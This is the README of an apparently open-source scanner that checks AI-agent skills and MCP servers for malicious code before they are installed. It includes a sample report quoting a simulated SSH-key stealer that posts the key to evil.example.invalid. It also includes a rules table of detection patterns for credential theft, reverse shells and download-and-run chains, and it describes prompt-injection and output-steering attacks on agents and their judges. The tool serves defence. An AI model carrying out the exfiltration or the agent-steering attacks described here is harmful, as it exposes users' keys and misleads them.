# SkillScan

Scan an AI-agent skill or MCP server before you install it.

AI-agent skills and MCP servers run on your machine, with your agent's
permissions — your files, your accounts, your keys. SkillScan reads a
skill folder *before* you install it and gives you one plain-English
verdict — **BLOCK**, **CAUTION**, or **PASS** — from deterministic rules.
By default no LLM is involved: the same folder always gets the same
answer, and every finding points at the exact rule, file, and line.
An optional LLM review mode (`--llm`, off by default) can *add*
findings on top — it can never remove or change them; see
[Modes](#modes-offline-default-and-llm-review-opt-in).

SkillScan is free and open source (MIT). There is no hosted tier and no
paid version — the whole tool lives in this repository.

## Example

```console
$ python3 -m skillscan samples/bad/ssh-stealer

SkillScan report for: .../samples/bad/ssh-stealer

Scanned 2 file(s); skipped 0.

Findings (5):
  [CAUTION] HOME_OR_SYSTEM_WRITE — steal.py:12
      Resolves or touches paths in the home directory or system locations (Path.home, expanduser, $HOME, /etc, /usr/local) instead of staying inside its own skill folder.
      > key_path = Path.home() / ".ssh" / "id_rsa"
  [BLOCK] SSH_CREDENTIAL_READ — steal.py:12 (x2)
      Reads SSH credential material (~/.ssh / private key files). A skill
      has no legitimate reason to read your SSH keys.
      > key_path = Path.home() / ".ssh" / "id_rsa"
  [BLOCK] EXFIL_COMBINATION — steal.py:14
      This skill both reads credential / private material AND has a way to
      send data out over the network. That combination is the exfiltration
      shape, whatever either half claims to be for.
  [CAUTION] NETWORK_ACCESS — steal.py:14
      Makes network requests. Network access is common in honest skills, but it is also the channel used to send your data away — check where it talks to.
      > requests.post("https://evil.example.invalid/collect", data=key_text)
  [BLOCK] NETWORK_SEND_DATA — steal.py:14 (x2)
      Sends data out over the network (HTTP POST/PUT, curl -d, a Request with a body). Combined with any local file access this is the classic exfiltration shape.
      > requests.post("https://evil.example.invalid/collect", data=key_text)

VERDICT: BLOCK
```

(That sample is a simulated stealer used only for testing — see
"Test corpus" below. It is never executed, only scanned.)

## Install / usage

Pure Python 3 standard library. No `pip install`, no dependencies.

```bash
git clone https://github.com/RakTikoo/skillscan
cd skillscan

python3 -m skillscan <path-to-skill-folder>              # text report
python3 -m skillscan <path-to-skill-folder> --format md   # Markdown report
python3 -m skillscan <path-to-skill-folder> --format json # machine-readable
python3 -m skillscan <path-to-skill-folder> --format sarif # SARIF 2.1.0 (toolchains)
python3 -m skillscan https://github.com/<owner>/<repo>   # clone + scan a repo
python3 skillscan.py <path-to-skill-folder>               # shim, same thing
python3 -m skillscan <path-to-skill-folder> --llm         # + optional LLM review (see Modes)
```

Repo URLs: only `https://github.com/<owner>/<repo>` is accepted.
SkillScan shallow-clones it into a temp dir (redirect-following
disabled), scans, and deletes the clone. Requires `git` on `PATH`.
npm package folders (`package.json`) and Python package folders
(`setup.py` / `pyproject.toml`) scan like any other folder, with
extra install-time checks (see the rules table).

How scanning works:

- SkillScan walks the folder (pruning `.git`, `__pycache__`, `node_modules`,
  venvs; symlinks are **not** followed) and scans **every regular file that
  decodes as text**, whatever its extension — `.py`, `.sh`, `.ps1`, `.js`,
  extensionless scripts, all of it. UTF-16/UTF-32 files are decoded via
  their BOM instead of being skipped as "binary".
- Python files are also parsed with `ast`, with **constant folding**
  (`"id_" + "rsa"`, f-strings, `chr()` codes, `"".join(...)`, simple
  variable propagation, `Path.home() / ".s" + "sh"` joins) and
  **import-alias resolution** (`import requests as rq`, `getattr`,
  `importlib.import_module`), so splitting strings or renaming imports
  does not hide behaviour.
- Shell scripts get simple variable expansion (`K="$HOME/.ssh/id_rsa"`)
  before rules run; JS gets string-concat squeezing and `fetch` POST
  detection; JSON / MCP manifests are parsed structurally (tools that
  declare arbitrary command execution or unconstrained file reads are
  flagged as manifest findings, not text coincidences).
- Documentation (`.md`, `.txt`, `.yaml`, …) is treated as documentation:
  findings there are capped at CAUTION, and lines that *warn against* a
  pattern ("never reads `~/.ssh`") are recognised as safety documentation,
  not behaviour. Cursor rules (`.cursorrules`, `.cursor/rules/*.mdc`) and
  other agent config/instruction files get the same documentation
  treatment.
- Findings are aggregated per rule per file, with a count.
- Scanned code is **never executed** — files are only read and parsed.

**Coverage is reported, not hidden.** Every report states how many files
were scanned and which were skipped (unreadable, over the 2 MB cap,
special files like FIFOs, symlinks, binary-looking content). If anything
suspicious was skipped — or nothing was scanned at all — the verdict
cannot be a clean PASS (`SCAN_INCOMPLETE`).

### Exit codes

| Exit code | Verdict  | Meaning                                            |
|-----------|----------|----------------------------------------------------|
| 0         | PASS     | No known-bad patterns were found in what was scanned. |
| 1         | CAUTION  | Something worth a human read before installing.    |
| 2         | BLOCK    | At least one block-severity pattern was found.     |
| 3         | —        | Usage / IO error: the scanner could not run (bad path, bad flags). Deliberately distinct from BLOCK. |

The exit codes make SkillScan usable as a CI / install-time gate.

## Modes: offline (default) and LLM review (opt-in)

SkillScan has two modes, and the report always shows which one ran.

**Offline mode — the default.** Exactly what is described above:
deterministic rules only, nothing leaves your machine, no account or
key, and the same folder always gets the same verdict. If you never
pass `--llm`, this is the whole tool — its output is unchanged from
v0.6, byte for byte.

**LLM mode — `--llm`.** After the offline scan (which runs first and
is never altered), the skill's *prose* — `SKILL.md` and
markdown/docs, never code — is sent to a language model for a second
opinion on the one family deterministic rules measurably cannot
finish: **semantic steering**, prose that tells the agent to mislead
you (report success on failure, hide errors, fabricate results,
present an advert as neutral advice). Files whose prose already drew
a deterministic CAUTION are reviewed first.

```bash
export SKILLSCAN_LLM_API_KEY=<your key>
python3 -m skillscan <path-to-skill-folder> --llm
python3 -m skillscan <path-to-skill-folder> --llm --llm-model qwen/qwen3.8-27b
```

The LLM mode is **provider-neutral by design**: one
OpenAI-compatible chat-completions client, configured by exactly
three settings — `--llm-base-url`, `--llm-model`, and the key in
`SKILLSCAN_LLM_API_KEY`. There is no provider-specific code path.
The shipped defaults are simply the **reference preset** (Groq's
free tier with a small model), because that is the configuration
the mode is measured against; every other row below is the same
client pointed elsewhere. (Only for the Groq preset,
`GROQ_API_KEY` is also accepted as the key variable — it is never
sent to any other host.)

| Provider | `--llm-base-url` | `--llm-model` | Key |
|---|---|---|---|
| Groq — reference preset, free tier | `https://api.groq.com/openai/v1` (default) | `qwen/qwen3.8-27b` (default) | `SKILLSCAN_LLM_API_KEY` or `GROQ_API_KEY` |
| OpenRouter (`:free` models) | `https://openrouter.ai/api/v1` | any `:free` model id | `SKILLSCAN_LLM_API_KEY` |
| Cerebras (free tier) | `https://api.cerebras.ai/v1` | e.g. `llama3.1-8b` | `SKILLSCAN_LLM_API_KEY` |
| Gemini (OpenAI-compatible endpoint) | `https://generativelanguage.googleapis.com/v1beta/openai/` | e.g. `gemini-3.5-flash-lite` (measured on the bake-off sets) | `SKILLSCAN_LLM_API_KEY` |
| OpenAI | `https://api.openai.com/v1` | e.g. `gpt-4o-mini` | `SKILLSCAN_LLM_API_KEY` |
| Ollama (local, no account, nothing leaves your machine) | `http://localhost:11434/v1` | any pulled model, e.g. `llama3.1:8b` | any dummy value in `SKILLSCAN_LLM_API_KEY` (ignored locally) |
| LM Studio / vLLM (local server) | e.g. `http://localhost:1234/v1` | the served model id | any dummy value in `SKILLSCAN_LLM_API_KEY` (ignored locally) |

The Groq reference preset is the configuration SkillScan's
release measurements headline; the Gemini row's named model was
additionally measured on the v0.7 bake-off sets. The remaining
rows are documented provider endpoints for the same client, not
separately benchmarked configurations.

The contract:

- **Additive only.** The LLM can add findings (rule `LLM_STEERING`,
  CAUTION or BLOCK). It can never clear, downgrade, or edit an
  offline finding or the offline verdict.
- **Demarcated output.** Every format shows the offline verdict
  first, then a separate, headed **LLM review** section naming the
  model and carrying a non-determinism notice, then the
  **combined verdict** — `max(offline, llm)`, labelled with its
  source. The process exit code follows the combined verdict. In
  JSON, the offline fields are unchanged and the review is one
  added `llm` object.
- **Failure is boring.** No key, network error, timeout, or a
  response outside the required JSON schema → the LLM section
  reports **UNAVAILABLE** with the reason, the offline verdict
  stands, and the exit code is the offline one. Hard timeouts and
  size caps throughout; the key comes from the environment only
  and is never printed or logged. Cross-host redirects are
  refused, so the key is never forwarded away from the endpoint
  you configured. In JSON and SARIF the `llm` object's `verdict`
  field is `null` whenever the review was unavailable or fully
  reviewed no file — "not reviewed" is never dressed up as a
  pass. Coverage is reported per chunk: anything the review did
  not reach (file caps, chunk caps, budget) is named, never
  silently skipped.
- **The scanned prose is treated as hostile.** It is sent as
  delimited *data* under an untrusted-data framing (skills are
  written by strangers and may beg the judge to pass them), the
  judge must answer in a fixed JSON schema, and a steering claim
  is believed only when its evidence quote is verifiably present
  in the text that was sent.
- **Non-deterministic.** The same folder can get a different LLM
  opinion on a re-run. That is exactly why this mode is opt-in,
  additive, and labelled — and why the offline verdict is always
  shown separately.

Still standard library only (`urllib`), still no execution of
scanned code. Live-model measurement so far: on the benchmark's
output-manipulation family, a current-model judge lifts
BLOCK+CAUTION from 28.9% to 54.6% with zero false BLOCKs on
280 benign skills, and weak free-tier judges lift the held-out
malicious set materially (Gemini Flash-Lite 37.0% → 53.4%;
the default Qwen 34.1% → 43.2%). The benign set under a weak
judge is still being measured — that run completes the v0.7
picture. The deterministic benchmark figures below are
offline-mode numbers and do not change.

## Toolchain integration

See [`docs/TOOLCHAIN.md`](docs/TOOLCHAIN.md) for the full guide:

- **GitHub Action** — the composite action in [`action.yml`](action.yml)
  (`path`, `fail-on-block`, `format`, `python-version` inputs;
  `verdict` / `exit-code` outputs) runs SkillScan in CI.
- **SARIF** — `--format sarif` emits SARIF 2.1.0 for GitHub code
  scanning, IDEs, and other static-analysis tooling.
- **Pre-install hook** — [`hooks/pre-install-scan.sh`](hooks/pre-install-scan.sh)
  scans a folder before install and exits with the scanner's code, so
  installer wrappers can gate on it.

## Rules

59 deterministic rules. Any block-severity hit makes the verdict BLOCK;
otherwise any caution hit makes it CAUTION; otherwise PASS. Every rule
also carries an OWASP mapping (LLM Top 10 / MCP Top 10 category codes),
surfaced per finding in JSON output and in SARIF rule metadata — it is
triage metadata only and never affects the verdict.

| Rule | Severity | What it catches |
|------|----------|-----------------|
| SSH_CREDENTIAL_READ | block | Reads `~/.ssh`, `id_rsa`, `id_ed25519`, other private-key files |
| AGENT_CREDENTIAL_READ | block | Reads an AI agent's own credential store (`~/.claude/.credentials.json`, `~/.codex/auth.json`, Gemini/OpenCode auth files). Counts as credential material for EXFIL_COMBINATION and value tracking, like an SSH key |
| AGENT_CONFIG_WRITE | block | Code that writes, appends, copies or registers into a GLOBAL agent configuration — `~/.claude/CLAUDE.md`, global settings or SessionStart hooks, `~/.codex` config, a desktop app's MCP config (`claude mcp add` included), global editor/agent rules. Documentation telling the user to make the same change themselves is the same rule at caution; a skill's own project-local `.claude`/`.codex`/`.mcp` files never count |
| CLOUD_CREDENTIAL_READ | block | Reads `~/.aws`, `~/.azure`, `~/.gcloud` credential material |
| ENV_FILE_READ | block | Reads a `.env` file / loads dotenv (JS `process.env` is *not* this rule) |
| ENVIRON_SECRET_ACCESS | caution | Accesses `os.environ` / `getenv(...)` / `process.env` |
| NETWORK_ACCESS | caution | Makes network requests (`requests`, `urllib`, `httpx`, `fetch`, sockets, Node `http`/`https` module calls) |
| NETWORK_SEND_DATA | block | Sends data out (HTTP POST/PUT, GET with params/data, `curl -d`, `Request` with a body, socket send) |
| EXFIL_COMBINATION | block | Skill reads credential material **and** has a network send channel |
| SHELL_SUBPROCESS | caution | Runs programs via `subprocess` / `child_process` |
| SHELL_OS_SYSTEM | block | Runs shell strings via `os.system` / `os.popen` |
| EVAL_EXEC | block | `eval(...)` / `exec(...)` / `__import__(...)` of dynamic code |
| BASE64_OBFUSCATION | caution | Decodes base64 / encoded blobs |
| DECODE_AND_RUN | block | Decodes an encoded payload *and* executes dynamic code in the same file |
| CURL_PIPE_BASH | block | `curl ... \| bash` / `wget ... \| sh` download-and-run |
| FILE_DELETE | caution | Deletes files (`os.remove`, `os.unlink`, `shutil.rmtree`) |
| RM_RF | block | `rm -rf` recursive forced deletion (in code; in docs it is a caution) |
| PERSISTENCE | block | Crontab, `.bashrc`, LaunchAgents, systemd, autostart entries (in code; in docs it is a caution) |
| HOME_OR_SYSTEM_WRITE | caution | Resolves/touches home or system paths (`Path.home()`, `expanduser`, `$HOME`, `/etc/`, `getpwuid`, `os.homedir()`) |
| CHMOD_CHOWN | caution | Changes permissions/ownership (`chmod`, `chown`, `os.chmod`) |
| RUNTIME_PACKAGE_INSTALL | caution | Installs packages at run time (`pip install`, `npm install`, `apt-get install`, …). Documentation that merely tells the user to install a *named* package from the official registry (or the declared requirements file) is ordinary setup prose and is not flagged |
| INSTALL_FROM_URL | caution | An install command takes its package from a URL, git source, archive file, local path, or non-official package index instead of the official registry |
| DYNAMIC_IMPORT | caution | `importlib.import_module` that static review cannot resolve, or a JS `require()` of a computed, non-literal path |
| CREDENTIAL_ENUMERATION | caution | Glob/walk patterns that look like credential discovery (`id_*`, `.ssh*`) |
| MCP_UNRESTRICTED_EXEC | block | MCP manifest tool that runs arbitrary caller-supplied commands with no constraint |
| MCP_UNRESTRICTED_READ | caution | MCP manifest tool that reads arbitrary files by unconstrained path |
| MCP_SERVER_COMMAND | caution | MCP manifest that starts its server via a shell/interpreter/package-runner command |
| HARDCODED_SECRET_LIVE | block | A credential in an unambiguous live format in the code: AWS key id (`AKIA…`), GitHub token (`ghp_…`, `github_pat_…`), `sk-` API key, Slack token, or a private-key block (placeholders and marked documentation examples are not flagged) |
| HARDCODED_SECRET_GENERIC | caution | A long, high-entropy literal assigned to a password/secret/token variable (env-var references and obvious placeholders are not flagged) |
| CLOUD_METADATA_ACCESS | caution | References a cloud metadata endpoint (`169.254.169.254`, `169.254.170.2`, `metadata.google.internal`, `/latest/meta-data/`) — a source of live cloud credentials |
| CLOUD_METADATA_EXFIL | block | Touches a cloud metadata endpoint **and** reads credential material or has a network send channel |
| BROWSER_CREDENTIAL_STORE | caution | Touches browser/wallet credential storage (`Login Data`, `logins.json`, `key4.db`, `Local State`, browser profile dirs, wallet extension storage); counts as credential material for EXFIL_COMBINATION |
| REVERSE_SHELL | block | A raw socket wired to a shell (`dup2` of the socket fd, `pty.spawn`, `/dev/tcp`, or spawning `/bin/sh` alongside a socket) |
| ERROR_INFO_LEAK | caution | Returns raw exception text, a stack trace, or an environment dump as a tool result (logging the error and returning a plain message is not flagged) |
| PACKAGE_INSTALL_SCRIPT | caution | Package runs code at install time: an npm lifecycle script (`preinstall`/`install`/`postinstall`/`prepare`) or a `setup.py` that reaches for subprocess/network/sockets |
| PACKAGE_INSTALL_SCRIPT_EXEC | block | An install-time script downloads or executes outside code (curl/wget, pipe-to-shell, encoded payload, remote fetch) |
| DEPENDENCY_SOURCE | caution | A dependency manifest (`package.json` — including `package.template.json` templates — requirements file, `pyproject.toml`, `setup.py`, `Pipfile`) sources a dependency from outside the official registry: a git URL, a direct archive link, a local file path, or a non-official index |
| DEPENDENCY_EXECUTION | block | The skill both sources a dependency off-registry **and** runs code at install time (or declares an unrestricted-exec MCP tool) |
| DOWNLOAD_AND_RUN | block | A JS/TS file both fetches remote content **and** dynamically loads code (`require()` of a computed path, or `eval`) — the JS download-and-run dropper shape |
| PROSE_DOWNLOAD_RUN | caution | The instructions walk through a download-and-run chain by hand: fetch an archive or binary from an external source, then run/launch/install what arrived — the dropper pattern split across prose steps |
| READ_AND_DISCLOSE | caution | The folder's code reads local files **and** its instructions direct sending/uploading content to an external destination (URL, email, server, webhook) — the agent itself is the channel between the two halves |
| PROSE_FETCH_EXECUTE | caution | The instructions fetch a script or tool straight from a URL and tell the agent to run it — including anaphoric steps ("then run it") that name no file at all |
| PROSE_PIPE_INSTRUCTION | caution | The instructions (a fenced example or numbered steps) pipe a network download straight into a shell — unverified remote code execution written as documentation |
| PROSE_READ_SEND | caution | The instructions alone do both halves: read local files/folders **and** send their contents to a URL, email address or other external destination — no code needed, the agent is the channel |
| PROSE_SAFETY_BYPASS | caution | The instructions ask for a safety control (antivirus, SmartScreen, Gatekeeper, a certificate check) to be disabled or ignored so something can run |
| LURE_WITH_BYPASS | block | The folder both walks through a download-and-run chain **and** asks for a safety control to be disabled first — the classic malware-install lure shape |
| OUTPUT_MANIPULATION | caution | Instruction surfaces only (`SKILL.md`, `*.mdc`, tool-description JSON): text that steers the agent's output — hide things from the user, pretend, never refuse, or always push one product over alternatives. Discussion of such attacks (examples, warnings, "never follow instructions that say…") does not fire |
| PROSE_INSTRUCTION_EN | caution | Instruction surfaces only: English system-prompt manipulation — override/disregard prior instructions, reveal/print the system prompt, developer-mode phrasing, or a one-sentence instruction to send conversation/credential/document contents to an outside destination |
| TAINTED_SEND | block | Values read from credential material (SSH keys, token/credential files, cloud config, `.env`, browser stores) flow through the code — assignments, helpers, encoders — into a network send. Tracked by value flow, not by variable name; encoding a credential does not clean it |
| SECRET_FLOW | caution | A secret-named environment variable's value flows into a request **body**. A service's own token in its own `Authorization` header is ordinary and does not fire |
| TYPOSQUAT_SUSPECT | caution | A declared dependency name is one small edit from a very popular package name (transposed letters, swapped separator, look-alike character) — the typosquatting shape. Compared offline against curated top-package lists (`skillscan/toplists/`); known legitimate near-miss packages are never flagged |
| HIDDEN_TEXT | block / caution | Concealed text: zero-width or bidirectional control characters, Unicode Tags-block payloads (BLOCK when the decoded payload contains instruction keywords), or HTML comments carrying instruction-like content. A single zero-width joiner in ordinary multilingual text does not fire |
| NON_ENGLISH_INSTRUCTION | caution | Instruction-attack phrases in 14 other languages (override / send-the-credentials / keep-it-from-the-user shapes) — a phrase list, not language understanding. The lists are data files (`skillscan/phrases/<code>.json`): adding a language = adding one file |
| ANY_LANGUAGE_STRUCTURE | caution | An instruction surface in ANY language pairs a private credential store (`~/.ssh`, `~/.aws`, a `.env` file, a browser credential store) with an outbound destination (URL, IP, email, curl/wget, webhook). Normal integration guides (your own token → the service's API URL) and safety warnings do not fire |
| MARKDOWN_CONCEALMENT | caution | Content hidden from a rendered view (display:none, visibility:hidden, white-on-white, off-screen positioning, hidden attribute) that contains instruction-grade wording. A plain `<details>` disclosure block does not fire on its own |
| SUBSTITUTION_EXEC | block / caution | Executes a download via shell substitution: `$(curl …)`, backtick curl/wget, `<(curl …)` (BLOCK in code files). A substitution that only captures the download into a variable that is never executed — e.g. a Makefile `$(shell …)` assignment — is CAUTION, and so is the executing form shown inside documentation, where it is a code-fence example rather than code that runs (v0.4 precision fix) |
| ENV_INJECTION | caution | Touches `LD_PRELOAD` / `DYLD_INSERT_LIBRARIES` / `PYTHONSTARTUP`, or writes a fixed-name file under `/tmp` and makes it executable or runs it |
| ENV_INJECTION_INSTALL | block | An install-time or server-start context (npm lifecycle script, `setup.py`, MCP manifest env, a `.pth` startup file) sets `LD_PRELOAD` / `DYLD_INSERT_LIBRARIES` / `PYTHONSTARTUP` / (install contexts) `PYTHONPATH`, or a `.pth` file carries an `import` line |
| SCAN_INCOMPLETE | caution | Some content could not be scanned, or nothing was scanned — the verdict is partial. Includes compiled code with no inspectable source: a `.pyc` with no matching `.py`, or a native binary in a folder with no source at all |

Every rule ships with a plain-English reason in the report, so a
non-specialist can understand *why* something was flagged.

## What this is not

SkillScan is a **linter, not a guarantee of safety**.

- A **PASS** means "no known-bad patterns were found in the files that
  were scanned" — not "this skill is safe".
- A **BLOCK** means a pattern strongly associated with malicious skills
  was found — read the finding before judging; context matters.
- SkillScan does not run the skill, does not sandbox anything, and does
  not replace reading the code of anything you install with broad
  permissions.

### Known limits (kept honest, from adversarial review)

SkillScan v0 was reviewed by three independent adversarial reviewers
(red-team evasion, false-positive hunting, code/scope audit). The first
version failed badly — 0 of 17 evasion mutations got a BLOCK, and benign
skills were BLOCKed by their own safety documentation. Those defects
were fixed (see the test suites below). What **still** evades or
challenges it, by design of static analysis:

- **Runtime behaviour is invisible.** Code that decides what to do from
  a server response, the date, or an encrypted config can look clean.
- **Strong encryption / packing** of a payload (beyond base64/hex) is
  flagged at most as obfuscation, not decoded.
- **JS/TS is regex + string-squeezing, not a full AST** — deeply dynamic
  JS (computed property access, `eval` of assembled strings via indirect
  routes) can still slip through.
- **Multi-file dataflow** is shallow: a credential read in one file and
  a send in another are combined at skill level (`EXFIL_COMBINATION`),
  but value-level taint tracking across files is not done.
- **CAUTION is noisy by design** for capability flags: a backup tool
  *should* be flagged for subprocess + deletion, a weather skill for
  network + an env API key. `expanduser()` on a user-supplied path is
  currently flagged as home access — a known over-broad caution.
- **Secret detection is heuristic.** The live-format tier needs the
  complete token in one place; the generic tier's regex floor is an
  8-character value, but its entropy requirement (≥3.5 bits per
  character over at least 6 distinct characters) puts the *effective*
  minimum at roughly 12 characters — so short, weak, split or encoded
  secrets evade it, and a random-looking *test* value can trip the
  CAUTION tier. Live-format values in test files or next to FAKE_ /
  FIXTURE markers are downgraded to CAUTION, not blocked. Placeholders
  and marked examples are suppressed, but suppression is substring-based.
- **Metadata / reverse-shell rules are shape-based.** A metadata
  endpoint reached through a resolved hostname or non-standard path, or
  a socket shell wired in an unusual way, can evade them.
- **MCP coverage is structural for common manifest shapes** (`tools[]`,
  `mcpServers`) — exotic manifest layouts may only get text-level rules.
- **Scan budgets are finite.** A scan stops after 2,000 files or 32 MB
  of content (per-file cap 2 MB), and lines are matched after truncation
  at 100,000 characters. Hitting a budget is reported as a suspicious
  skip and forces `SCAN_INCOMPLETE`, so a huge folder degrades to
  CAUTION — never to a silent PASS and never to a hang.
- **Concealment and phrase checks are mechanics, not meaning.**
  `HIDDEN_TEXT` / `MARKDOWN_CONCEALMENT` detect invisible characters
  and hidden elements; `NON_ENGLISH_INSTRUCTION` matches a fixed
  phrase list in 14 languages. None of them understands what prose
  *means*: a novel phrasing, an uncovered language, or a purely
  semantic deception still passes — see the coverage map's Gap B.
  Ordinary multilingual text is deliberately protected (single
  zero-width joiners in Persian/Indic/emoji contexts do not fire), so
  the trade is recall, not false alarms on real-world text.

### Scanner hardening

SkillScan reads untrusted folders, so the scanner itself is treated as
an attack surface (`run_security_tests.py` covers this): symlinks are
never followed, special files (FIFOs, sockets) are skipped rather than
opened, archives are **never extracted**, and a hostile folder cannot
crash the CLI into a traceback — scan failures exit with code 3.
Text and Markdown reports escape control characters from scanned file
names and content, so a malicious folder cannot inject ANSI escapes or
forge report lines in your terminal (JSON output is escaped by its
encoding). To report a vulnerability in SkillScan itself, see
[SECURITY.md](SECURITY.md) — please use GitHub's private vulnerability
reporting, not a public issue.

## Test corpus

`samples/` and `samples-mutations/` contain simulated skills that exist
**only to be scanned — never run them**. Every sample in v0.1 is
**simulated or mutation-based**, written for this project. **Audit-derived
sample files are not included in v0.1** — instead of recreating real
attack samples, [`docs/AUDIT_COVERAGE.md`](docs/AUDIT_COVERAGE.md) maps
the techniques from published audits to the rules below and states,
technique by technique, what is covered and what is not.

| Corpus | Contents | Expected |
|--------|----------|----------|
| `samples/good/` (2) | Benign skills reading files in their own folder | PASS (exit 0) |
| `samples/bad/` (2) | SSH-key stealer; base64 dropper + `curl \| bash` | BLOCK (exit 2) |
| `samples/caution/` (1) | Legit-sounding backup skill using `subprocess` + file deletion | CAUTION (exit 1) |
| `samples-mutations/` (17) | The stealer/dropper/manifest rewritten with evasion techniques: string concatenation, pathlib joins, `importlib`/`getattr`, alias imports, `chr()` codes, chunked base64, JS `fetch`, shell variables, glob discovery, GET-param exfil, PowerShell payload, UTF-16 encoding, unrestricted MCP manifest | BLOCK (exit 2), every one |

Run the suites with:

```bash
python3 run_tests.py           # shipped samples
python3 run_mutation_tests.py  # 17 evasion mutations — all must BLOCK
python3 run_edge_tests.py      # FIFO hang, oversize, empty, usage codes, UTF-16
python3 run_security_tests.py  # hostile folders vs the scanner itself (see below)
python3 run_v02_tests.py       # v0.2: secrets, metadata, browser stores, reverse shells, error leaks, npm/PyPI targets, Cursor rules, repo URLs, SARIF, Action + hook (fixtures are inert and built in a temp dir)
python3 run_v03_tests.py       # v0.3: hidden text (zero-width/Tags/BiDi/comments), non-English instruction phrases, Markdown concealment, substitution exec, session sends, bytecode honesty, env injection, OWASP metadata (fixtures are inert and built in a temp dir)
python3 run_v04_tests.py       # v0.4: dependency sources (off-registry manifests, install-execution combination), JS http/https + download-and-run, install-prose refinement (named-registry docs pass, URL installs flag), substitution documentation cap, directive-comment recalibration, prose download-run chain, read-and-disclose combination (fixtures are inert and built in a temp dir)
python3 run_v04fix_tests.py    # v0.4 fix pass: scanner-DoS perf shapes, inert-text (comment/string) precision, routine-lifecycle + same-package combination scoping, urllib.parse classification, and one regression case per adversarial-review evasion (fixtures are inert and built in a temp dir)
python3 run_v05_tests.py       # v0.5: prose fetch-execute / pipe / read-send chains + safety-bypass lure, output-manipulation + prompt-manipulation phrases on instruction surfaces, taint-lite (credential flow to sends), offline typosquat + its harvested-name validation gate (fixtures are inert and built in a temp dir)
python3 run_v05fix_tests.py    # v0.5 fix pass: scope-aware flow-sensitive taint (no BLOCK on a name collision), lure proximity + framing suppression, guard-laundering closures, output-manipulation frame scoping, typosquat manifest extraction (bare names, setup.py, homoglyphs), one regression case per adversarial-review finding (fixtures are inert and built in a temp dir)
python3 run_v06_tests.py       # v0.6: agent-config poisoning — silent writes/registrations into global agent configs BLOCK, agent credential-store reads BLOCK and flow into the exfil combinations, user-mediated prose at CAUTION, own-folder/project-local configs never flagged (fixtures are inert and built in a temp dir)
python3 run_v06fix_tests.py    # v0.6 fix pass: mediation demotion (prompt/flag-gated config writes at CAUTION), real-read discipline (exists/stat probes never count), direction-aware writes, stale-binding kills, red-team evasion closures, matcher timing bombs (fixtures are inert and built in a temp dir)
python3 run_v06fix2_tests.py   # v0.6 fix wave 2: demotion hardening (code-only signals, called helpers, guarding shell prompts, delete-only disqualifiers, flag polarity/tautology), folder-aware mediation, widened primitives (JS prompts, GUI dialogs, Ruby gets), ../. resolution, dd/tar/unzip + batch/helper credential reads, tilde-user writes, audit-2 perf shapes + stale-token fix, four timed bomb shapes (fixtures are inert and built in a temp dir)
```

## Coverage against published audits

[`docs/AUDIT_COVERAGE.md`](docs/AUDIT_COVERAGE.md) maps 25 techniques
from four published audits of real malicious skills / MCP servers
against the 59 rules above. Summary (Covered / Partial / Gap per audit):

| Audit | Covered | Partial | Gap |
|-------|---------|---------|-----|
| Snyk — ToxicSkills, Feb 2026 (3,984 skills scanned) | 3 | 5 | 3 |
| Koi Security — ClawHavoc, Feb 2026 (341 malicious skills) | 1 | 4 | 2 |
| Invariant Labs — MCP Tool Poisoning, Apr 2025 | 0 | 2 | 2 |
| Koi Security — postmark-mcp backdoor, Sep 2025 | 0 | 2 | 1 |
| **Total (25 techniques)** | **4** | **13** | **8** |

The honest pattern: SkillScan is strong on the *code-shaped* half of
these audits (credential reads, network exfiltration, decode-and-run
droppers) and weak on the *language-shaped* half (deceptive instructions
in prose or MCP tool descriptions, rug pulls, registry-level tricks) —
several of which no static folder scanner can see. The map gives the
per-technique reasoning and the test-suite evidence (or the lack of it)
for every cell. Read it before trusting a PASS.

Each suite scans samples as subprocesses, asserts verdicts and exit
codes, and exits non-zero on any failure.

## Benchmarks

SkillScan's own measured rates on a public labelled corpus —
**MaliciousSkillBench** (9,740 labelled skills, pinned at commit
`893afd6`), run 2026-11-11 with SkillScan **v0.6.0**. Malicious skills
were scanned as complete extracted folders; benign skills are shipped
by the benchmark as frozen text, so each was scanned as a single
`SKILL.md` folder. Nothing was executed — folders were read as text
only. Full methodology, counting rules and caveats:
[`docs/BENCHMARKS.md`](docs/BENCHMARKS.md).

| Set | Skills | BLOCK | CAUTION | PASS |
|-----|--------|-------|---------|------|
| Malicious | 7,421 | **45.8%** (3,399) | 36.6% (2,718) | 17.6% (1,304) |
| Benign | 2,235 | 0% false BLOCKs (0) | 24.9% (557) | 75.1% (1,678) |

Detection at BLOCK+CAUTION (flagged at any severity): **82.4%** of
malicious skills; 24.9% of benign skills were flagged at any severity.

Detection by attack family (multi-label membership; BLOCK /
BLOCK+CAUTION):

| Family | Skills | BLOCK | BLOCK+CAUTION |
|--------|--------|-------|---------------|
| Privilege / tool-authority abuse | 1,004 | 74.5% | 99.4% |
| Execution / code delivery | 3,205 | 74.2% | 97.9% |
| Credential access | 197 | 55.3% | 95.9% |
| Persistence / control | 249 | 55.0% | 90.0% |
| Instruction / goal manipulation | 1,560 | 63.9% | 86.2% |
| Data exfiltration / disclosure | 266 | 35.0% | 83.8% |
| Resource / availability abuse | 330 | 22.7% | 90.3% |
| Dependency / supply chain | 167 | 13.2% | 87.4% |
| Integrity / output manipulation | 97 | 1.0% | 28.9% |

Honest limits, stated plainly:

- **Most misses are prose-only skills.** 886 of the 1,304 missed
  malicious skills are a single `SKILL.md` with no code at all. Among
  *pure* instruction-manipulation skills the BLOCK rate is 8.8%, and
  pure output manipulation is ~1% — deterministic rules see behaviour
  shapes, not meaning.
- **The benign side is prose-only** (see above), so the false-BLOCK
  figure measures prose-triggered false alarms, not code-triggered
  ones. That asymmetry is part of the corpus, and it is disclosed
  rather than smoothed over.
- **v0.5's gain is at CAUTION, not BLOCK.** BLOCK detection is
  unchanged from v0.4 in every labelled attack family (45.7%
  overall); BLOCK+CAUTION rose from 81.8% to 82.4% as the new prose
  chains, output-manipulation and value-flow rules flagged 47 skills
  v0.4 passed entirely. Benign false BLOCKs remain **0** on the same
  benign set; the benign flagged-at-any-severity rate rose from
  22.3% to 24.8% because the new rules also add CAUTIONs on benign
  prose.

## Licence

MIT — see [LICENSE](LICENSE). Copyright (c) 2026 RakTikoo.

## Status

v0.5. v0.1 was a Week 1 spike hardened by adversarial review; v0.2 adds
secret detection, cloud-metadata and browser-store rules, raw-socket
reverse-shell detection, error-leak detection, npm/PyPI package
targets, Cursor-rules handling, repo-URL scanning, SARIF output, and
toolchain integration (GitHub Action + pre-install hook). v0.3 adds
concealment mechanics (zero-width / Unicode Tags / BiDi characters,
instruction-carrying HTML comments, Markdown hiding places),
